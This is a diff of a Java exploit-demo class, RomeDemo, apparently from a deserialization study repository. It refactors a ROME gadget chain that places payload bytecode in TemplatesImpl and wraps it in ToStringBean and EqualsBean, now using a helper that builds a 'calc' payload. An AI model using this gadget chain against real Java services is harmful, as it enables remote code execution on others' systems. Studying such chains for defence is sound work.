@@ -1,5 +1,6 @@
 package Seri.RomeGadgets;
 
+import Seri.Utils;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.syndication.feed.impl.EqualsBean;
@@ -39,15 +40,9 @@ import static Seri.Utils.*;
 
 public class RomeDemo {
     public static void main(String[] args) throws Exception{
-        TemplatesImpl templatesimpl = new TemplatesImpl();
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
-        byte[] bytecodes = Files.readAllBytes(Paths.get("target/classes/Seri/ShellClass.class"));
-
-        setValue(templatesimpl,"_name","aaa");
-        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
-        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
-
-        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);
+        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
         ToStringBean fakeToStringBean = new ToStringBean(Templates.class,new TemplatesImpl());
 
         EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
